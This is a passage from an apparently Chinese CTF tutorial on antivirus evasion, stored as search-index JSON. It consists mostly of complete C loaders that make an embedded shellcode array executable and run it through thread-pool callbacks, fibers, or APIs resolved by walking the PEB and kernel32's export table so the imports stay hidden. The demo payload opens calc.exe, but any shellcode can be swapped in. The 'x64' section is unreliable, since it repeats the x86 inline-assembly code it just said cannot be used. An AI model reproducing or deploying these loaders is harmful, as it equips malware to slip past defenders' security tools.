SetThreadpoolWait\u51fd\u6570\u7528\u4e8e\u7ebf\u7a0b\u6c60\u4e2d\u6dfb\u52a0\u7b49\u5f85\u5bf9\u8c61\u7684\u51fd\u6570\u3002\n    \u5f53\u7b49\u5f85\u7684\u5185\u6838\u5bf9\u8c61\uff08\u5982\u4e8b\u4ef6\u3001\u4fe1\u53f7\u91cf\u7b49\uff09\u53d8\u4e3a\u6709\u4fe1\u53f7\u72b6\u6001\u65f6\uff0c\u7ebf\u7a0b\u6c60\u4f1a\u8c03\u7528\u4e0e\u7b49\u5f85\u5bf9\u8c61\u5173\u8054\u7684\u56de\u8c03\n    \u51fd\u6570\n    \u5176\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b:\n    VOID SetThreadpoolWait(\n    PTP_WAIT pwa, //\u6307\u5411\u8981\u6dfb\u52a0\u5230\u7ebf\u7a0b\u6c60\u7684\u7b49\u5f85\u5bf9\u8c61\u7684\u6307\u9488\n    HANDLE hObject, //\u8981\u7b49\u5f85\u7684\u5185\u6838\u5bf9\u8c61\u7684\u53e5\u67c4,\u5f53\u8fd9\u4e2a\u5185\u6838\u5bf9\u8c61\u53d8\u4e3a\u6709\u4fe1\u53f7\u72b6\u6001\u65f6,\u7ebf\u7a0b\u6c60\u4f1a\u8c03\u7528\n    \u4e0e\u7b49\u5f85\u5bf9\u8c61\u5173\u8054\u7684\u56de\u8c03\u51fd\u6570\n    PFILETIME pftTimeout //\u6307\u5411\u4e00\u4e2aFILETIME\u7ed3\u6784\u7684\u6307\u9488\uff0c\u8868\u793a\u7b49\u5f85\u8d85\u65f6\u7684\u65f6\u95f4\n    );\n    */\n    // \u5c06\u7b49\u5f85\u5bf9\u8c61\u6dfb\u52a0\u5230\u7ebf\u7a0b\u6c60\u4e2d,\u5f53\u4e8b\u4ef6\u5bf9\u8c61event\u89e6\u53d1\uff08\u53d8\u4e3a\u6709\u4fe1\u53f7\u72b6\u6001\uff09\u65f6\uff0c\u7ebf\u7a0b\u6c60\u4f1a\u8c03\u7528\u4e0ethreadPoolWait\u5173\u8054\u7684\u56de\u8c03\u51fd\u6570\n    SetThreadpoolWait(threadPoolWait, event, NULL);\n    // \u7b49\u5f85\u4e8b\u4ef6\u5bf9\u8c61\u53d8\u4e3a\u65e0\u4fe1\u53f7\u72b6\u6001\uff08\u8868\u793ashellcode\u6267\u884c\u5b8c\u6bd5\uff09\uff0c\u65e0\u9650\u7b49\u5f85\n    WaitForSingleObject(event, INFINITE);\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#7","title":"7.\u521b\u5efa\u7ea4\u7a0b\u8fd0\u884c","text":"<p>\u7ea4\u7a0b\uff08Fiber\uff09\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684\u7ebf\u7a0b\uff0c\u4e5f\u88ab\u79f0\u4e3a\u534f\u7a0b\uff08Coroutine\uff09\u6216\u5fae\u7ebf\u7a0b\uff08Microthread\uff09\u3002\u5b83\u4eec\u662f\u4e00\u79cd\u7528\u6237\u7ea7\u522b\u7684\u7ebf\u7a0b\uff0c\u7531\u7a0b\u5e8f\u81ea\u8eab\u7ba1\u7406\uff0c\u800c\u4e0d\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7ba1\u7406\u3002\u7ea4\u7a0b\u662f\u4e00\u79cd\u53ef\u4ee5\u63d0\u9ad8\u7a0b\u5e8f\u6267\u884c\u6548\u7387\u7684\u8c03\u5ea6\u673a\u5236\uff0c\u7279\u522b\u9002\u7528\u4e8e\u9700\u8981\u5927\u91cf\u5e76\u53d1\u6267\u884c\u4efb\u52a1\u7684\u573a\u666f</p> <pre><code>#include&lt;Windows.h&gt;\n#include&lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] =  \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nvoid main() {\n    // \u4fee\u6539shellcode\u6240\u5728\u5185\u5b58\u7684\u4fdd\u62a4\u5c5e\u6027\u4e3a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n    DWORD oldProtect;\n    VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    // \u5c06\u5f53\u524d\u7ebf\u7a0b\u8f6c\u6362\u4e3a\u7ea4\u7a0b\uff08\u8f7b\u91cf\u7ea7\u7ebf\u7a0b\uff09\n    ConvertThreadToFiber(NULL);\n    // \u521b\u5efa\u4e00\u4e2a\u7ea4\u7a0b\u5bf9\u8c61\uff0c\u5173\u8054\u5230shellcode\u4f5c\u4e3a\u7ea4\u7a0b\u5165\u53e3\u70b9\uff0c\u4f7f\u7528\u9ed8\u8ba4\u6808\u5927\u5c0f\u548c\u65e0\u6807\u5fd7\u4f4d\n    void* shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)(LPVOID)sc, NULL);\n    // \u5207\u6362\u5230\u65b0\u521b\u5efa\u7684\u7ea4\u7a0b\uff0c\u5f00\u59cb\u6267\u884cshellcode\n    SwitchToFiber(shellcodeFiber);\n    // shellcode\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u5220\u9664\u7ea4\u7a0b\u5bf9\u8c61\n    DeleteFiber(shellcodeFiber);\n}\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#8api","title":"8.\u52a8\u6001api\u51fd\u6570\u52a0\u8f7d","text":"<p>\u4f20\u7edf\u7684\u9759\u6001\u5bfc\u5165API\u51fd\u6570\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5bfc\u5165\u8868\u4e2d\u660e\u786e\u5217\u51fa\u6240\u6709\u7528\u5230\u7684\u51fd\u6570\u3002\u8fd9\u4f7f\u5f97\u6076\u610f\u4ee3\u7801\u5bb9\u6613\u88ab\u5b89\u5168\u5de5\u5177\u548c\u5206\u6790\u4eba\u5458\u53d1\u73b0\uff0c\u56e0\u4e3a\u654f\u611fAPI\u51fd\u6570\u7684\u4f7f\u7528\u901a\u5e38\u8868\u660e\u4e86\u6076\u610f\u884c\u4e3a\u3002\u6bd4\u5982\u4f7f\u7528\u521b\u5efa\u7ebf\u7a0b\u8fd0\u884cshellcode\u7684\u5bfc\u5165\u8868\u4e2d\u5c31\u5b58\u5728 <code>CreateThread api</code>\u51fd\u6570</p> <p></p> <p>\u800c\u52a8\u6001\u8c03\u7528API\u51fd\u6570\uff0c\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u89e3\u6790\u5e76\u83b7\u53d6API\u51fd\u6570\u7684\u5730\u5740\u3002\u8fd9\u6837\uff0c\u654f\u611f\u51fd\u6570\u4e0d\u4f1a\u51fa\u73b0\u5728\u5bfc\u5165\u8868\u4e2d\uff0c\u4ece\u800c\u4f7f\u5f97\u6076\u610f\u4ee3\u7801\u66f4\u96be\u88ab\u53d1\u73b0\u3002\u6b64\u5916\uff0c\u52a8\u6001\u8c03\u7528API\u51fd\u6570\u8fd8\u53ef\u4ee5\u7ed3\u5408\u5176\u4ed6\u6280\u672f\uff08\u5982\u4ee3\u7801\u6df7\u6dc6\u3001\u52a0\u5bc6\u7b49\uff09\u6765\u8fdb\u4e00\u6b65\u63d0\u9ad8\u6076\u610f\u4ee3\u7801\u7684\u9690\u853d\u6027</p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_4","title":"\u5b9e\u73b0\u601d\u8def","text":"<ul> <li>\u5b9a\u4f4d\u5173\u952e\u6a21\u5757\uff1a\u9996\u5148\u627e\u5230\u5305\u542b\u6838\u5fc3API\u51fd\u6570\u7684\u5173\u952e\u6a21\u5757\uff08\u5982kernel32.dll\uff09\u3002\u8fd9\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u89e3\u6790<code>PEB</code>\uff08Process Environment Block\uff09\u4e2d\u7684\u6a21\u5757\u5217\u8868\u6765\u5b8c\u6210\u3002</li> <li>\u83b7\u53d6<code>GetProcAddress</code>\uff1a\u5b9a\u4f4d\u5230kernel32.dll\u540e\uff0c\u9700\u8981\u89e3\u6790\u5bfc\u51fa\u8868\uff08Export Table\uff09\u4ee5\u83b7\u53d6GetProcAddress\u51fd\u6570\u7684\u5730\u5740\u3002GetProcAddress\u662f\u4e00\u4e2a\u6838\u5fc3\u51fd\u6570\uff0c\u7528\u4e8e\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u89e3\u6790\u5176\u4ed6API\u51fd\u6570\u7684\u5730\u5740\u3002</li> <li>\u52a0\u8f7d\u5176\u4ed6API\uff1a\u901a\u8fc7GetProcAddress\u51fd\u6570\uff0c\u53ef\u4ee5\u9010\u4e2a\u83b7\u53d6\u5176\u4ed6\u9700\u8981\u7684API\u51fd\u6570\u7684\u5730\u5740\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u901a\u8fc7GetProcAddress\u83b7\u53d6VirtualProtect\u3001CreateThread\u548cWaitForSingleObject\u7b49\u51fd\u6570\u7684\u5730\u5740\u3002</li> <li>\u51c6\u5907Shellcode\uff1a\u5c06Shellcode\u5b58\u50a8\u5728\u7f13\u51b2\u533a\u4e2d\uff0c\u4f7f\u7528VirtualProtect\u51fd\u6570\u5c06\u7f13\u51b2\u533a\u7684\u5185\u5b58\u9875\u5c5e\u6027\u66f4\u6539\u4e3a\u53ef\u6267\u884c\uff0c\u4ee5\u786e\u4fdd\u53ef\u4ee5\u5b89\u5168\u5730\u6267\u884cShellcode\u3002</li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#x86","title":"x86\u5b9e\u73b0","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n//\u58f0\u660e\u5b9a\u4e49api\u51fd\u6570\ntypedef FARPROC(WINAPI* p_GetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR\nlpProcName);\ntypedef HMODULE(WINAPI* p_LoadLibraryA)(__in LPCSTR lpLibFileName);\ntypedef BOOL(WINAPI* p_VirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);\ntypedef HANDLE(WINAPI* p_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,\nLPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);\ntypedef DWORD(WINAPI* p_WaitForSingleObject)(HANDLE, DWORD);\n// \u5185\u8054\u6c47\u7f16\u51fd\u6570\uff0c\u7528\u4e8e\u83b7\u53d6Kernel32.dll\u6a21\u5757\u7684\u57fa\u5730\u5740\nHMODULE inline __declspec(naked) GetKernel32Moudle()\n{\n    __asm\n     {\n         mov eax, fs: [0x30] ;\n         mov eax, [eax + 0xc];\n         mov eax, [eax + 0x14]\n         mov eax, [eax];\n         mov eax, [eax];\n         mov eax, [eax + 0x10];\n         ret;\n     }\n}\n//\u83b7\u53d6GetProcAddress\u51fd\u6570\u7684\u5730\u5740\nDWORD pGetProcAddress(HMODULE Kernel32Base) {\n    char szGetProcAddr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };\n    DWORD result = NULL;\n    // \u904d\u5386kernel32.dll\u7684\u5bfc\u51fa\u8868\uff0c\u627e\u5230GetProcAddr\u51fd\u6570\u5730\u5740\n    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;\n    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Kernel32Base +\n    pDosHead-&gt;e_lfanew);\n    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;\n    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)\n    ((DWORD)Kernel32Base + pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfFunctions);\n    WORD* pAddOfOrd_Raw = (WORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNameOrdinals);\n    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNames);\n    char* pFinded = NULL, * pSrc = szGetProcAddr;\n    for (DWORD dwCnt = 0; dwCnt &lt; pExport-&gt;NumberOfNames; dwCnt++)\n    {\n        pFinded = (char*)((DWORD)Kernel32Base + pAddOfNames_Raw[dwCnt]);\n        while (*pFinded &amp;&amp; *pFinded == *pSrc)\n        {\n            pFinded++; pSrc++;\n        }\n        if (*pFinded == *pSrc)\n        {\n            result = (DWORD)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]];\n            break;\n        }\n        pSrc = szGetProcAddr;\n    }\n    return result;\n}\nint main() {\n    unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n    HMODULE hKernal32 = GetKernel32Moudle(); // \u83b7\u53d6Kernel32\u6a21\u5757\u7684\u5730\u5740\n    p_GetProcAddress GetProcAddress = (p_GetProcAddress)pGetProcAddress(hKernal32); // \u83b7\u53d6GetProcAddress\u51fd\u6570\u7684\u5730\u5740\n    p_VirtualProtect VirtualProtect = (p_VirtualProtect)GetProcAddress(hKernal32,\n    \"VirtualProtect\"); //\u83b7\u53d6VirtualProtect\u51fd\u6570\u5730\u5740\n    p_CreateThread CreateThread = (p_CreateThread)GetProcAddress(hKernal32,\n    \"CreateThread\"); //\u83b7\u53d6CreateThread\u51fd\u6570\u5730\u5740\n    p_WaitForSingleObject WaitForSingleObject =\n    (p_WaitForSingleObject)GetProcAddress(hKernal32, \"WaitForSingleObject\"); //\u83b7\u53d6WaitForSingleObject\u51fd\u6570\u5730\u5740\n    DWORD oldProtect;\n    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf,\n    NULL, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#x64","title":"x64\u5b9e\u73b0","text":"<p>\u7531\u4e8ex64\u65e0\u6cd5\u7f16\u5199\u5185\u8054\u6c47\u7f16\u4ee3\u7801, \u56e0\u6b64\u9700\u53e6\u521b\u4e00\u4e2aasm\u6587\u4ef6\u6765\u8fdb\u884c\u7f16\u5199</p> <p>\u53f3\u952e,\u6dfb\u52a0,\u65b0\u5efa\u9879</p> <pre><code>GetInitializationOrderModuleList.asm\n</code></pre> <p></p> <p>\u6b64\u5904\u6211\u521b\u5efa\u4e86\u4e00\u4e2a GetInitializationOrderModuleList.asm , \u7528\u4e8e\u83b7\u53d6 InitializationOrderModuleList , \u5176\u4ee3\u7801\u5982\u4e0b\u6240\u793a:</p> <pre><code>.CODE\nGetInInitializationOrderModuleList PROC\nmov rax,gs:[60h] ; PEB\uff0c\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e0d\u80fd\u51990x60\nmov rax,[rax+18h] ; PEB_LDR_DATA\nmov rax,[rax+30h] ; InInitializationOrderModuleList\nret ; \u8fd9\u91cc\u4e0d\u80fd\u5199retn\nGetInInitializationOrderModuleList ENDP\nEND\n</code></pre> <p>\u968f\u540e\u9f20\u6807\u53f3\u952e\u5355\u51fb\u65b0\u5efa\u7684asm\u6587\u4ef6, \u9009\u62e9\u5c5e\u6027, \u5728\u5e38\u89c4\u9009\u9879\u5904\u5c06 \u4ece\u751f\u6210\u4e2d\u6392\u9664 \u8bbe\u7f6e\u4e3a \u5426 , \u9879\u7c7b\u578b\u8bbe\u7f6e\u4e3a \u81ea\u5b9a\u4e49\u751f\u6210\u5de5\u5177</p> <p></p> <p>\u5728\u81ea\u5b9a\u4e49\u751f\u6210\u5de5\u5177\u9009\u9879\u5904, \u5728\u547d\u4ee4\u884c\u6846\u8f93\u5165: <code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code>, \u5728\u8f93\u51fa\u6846\u8f93\u5165: <code>$(IntDir)%(FileName).obj</code></p> <pre><code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm\n$(IntDir)%(FileName).obj\n</code></pre> <p></p> <p>\u6253\u5f00\u9879\u76ee\u5c5e\u6027\uff0c\u52fe\u9009 C/C++-&gt;\u4ee3\u7801\u751f\u6210-&gt;\u7981\u7528\u5b89\u5168\u68c0\u67e5</p> <p></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n//\u58f0\u660e\u5b9a\u4e49api\u51fd\u6570\ntypedef FARPROC(WINAPI* p_GetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR\nlpProcName);\ntypedef HMODULE(WINAPI* p_LoadLibraryA)(__in LPCSTR lpLibFileName);\ntypedef BOOL(WINAPI* p_VirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);\ntypedef HANDLE(WINAPI* p_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,\nLPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);\ntypedef DWORD(WINAPI* p_WaitForSingleObject)(HANDLE, DWORD);\n// \u5185\u8054\u6c47\u7f16\u51fd\u6570\uff0c\u7528\u4e8e\u83b7\u53d6Kernel32.dll\u6a21\u5757\u7684\u57fa\u5730\u5740\nHMODULE inline __declspec(naked) GetKernel32Moudle()\n{\n    __asm\n     {\n         mov eax, fs: [0x30] ;\n         mov eax, [eax + 0xc];\n         mov eax, [eax + 0x14]\n         mov eax, [eax];\n         mov eax, [eax];\n         mov eax, [eax + 0x10];\n         ret;\n     }\n}\n//\u83b7\u53d6GetProcAddress\u51fd\u6570\u7684\u5730\u5740\nDWORD pGetProcAddress(HMODULE Kernel32Base) {\n    char szGetProcAddr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };\n    DWORD result = NULL;\n    // \u904d\u5386kernel32.dll\u7684\u5bfc\u51fa\u8868\uff0c\u627e\u5230GetProcAddr\u51fd\u6570\u5730\u5740\n    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;\n    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Kernel32Base +\n    pDosHead-&gt;e_lfanew);\n    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;\n    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)\n    ((DWORD)Kernel32Base + pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfFunctions);\n    WORD* pAddOfOrd_Raw = (WORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNameOrdinals);\n    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNames);\n    char* pFinded = NULL, * pSrc = szGetProcAddr;\n    for (DWORD dwCnt = 0; dwCnt &lt; pExport-&gt;NumberOfNames; dwCnt++)\n    {\n        pFinded = (char*)((DWORD)Kernel32Base + pAddOfNames_Raw[dwCnt]);\n        while (*pFinded &amp;&amp; *pFinded == *pSrc)\n        {\n            pFinded++; pSrc++;\n        }\n        if (*pFinded == *pSrc)\n        {\n            result = (DWORD)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]];\n            break;\n        }\n        pSrc = szGetProcAddr;\n    }\n    return result;\n}\nint main() {\n    unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n    HMODULE hKernal32 = GetKernel32Moudle(); // \u83b7\u53d6Kernel32\u6a21\u5757\u7684\u5730\u5740\n    p_GetProcAddress GetProcAddress = (p_GetProcAddress)pGetProcAddress(hKernal32); // \u83b7\u53d6GetProcAddress\u51fd\u6570\u7684\u5730\u5740\n    p_VirtualProtect VirtualProtect = (p_VirtualProtect)GetProcAddress(hKernal32,\n    \"VirtualProtect\"); //\u83b7\u53d6VirtualProtect\u51fd\u6570\u5730\u5740\n    p_CreateThread CreateThread = (p_CreateThread)GetProcAddress(hKernal32,\n    \"CreateThread\"); //\u83b7\u53d6CreateThread\u51fd\u6570\u5730\u5740\n    p_WaitForSingleObject WaitForSingleObject =\n    (p_WaitForSingleObject)GetProcAddress(hKernal32, \"WaitForSingleObject\"); //\u83b7\u53d6WaitForSingleObject\u51fd\u6570\u5730\u5740\n    DWORD oldProtect;\n    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf,\n    NULL, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_5","title":"\u7b80\u6613\u7248","text":"<p>\u8be5\u7248\u672c\u6ca1\u6709\u81ea\u5b9e\u73b0 \u52a8\u6001\u83b7\u53d6 GetProcAddress \u51fd\u6570\u5730\u5740, \u800c\u662f\u76f4\u63a5\u4f7f\u7528\u5e76\u901a\u8fc7GetProcAddress\u83b7\u53d6\u5176\u4ed6windows api\u51fd\u6570\u5730\u5740</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n// VirtuallAlloc\ntypedef LPVOID(WINAPI* lpVirtualAlloc)(\n  LPVOID lpAddress, // region to reserve orcommit\n  SIZE_T dwSize, // size of region\n  DWORD flAllocationType, // type of allocation\n  DWORD flProtect // type of accessprotection\n  );\n// CreateThread\ntypedef HANDLE(WINAPI* hCreateThread)(\n  LPSECURITY_ATTRIBUTES 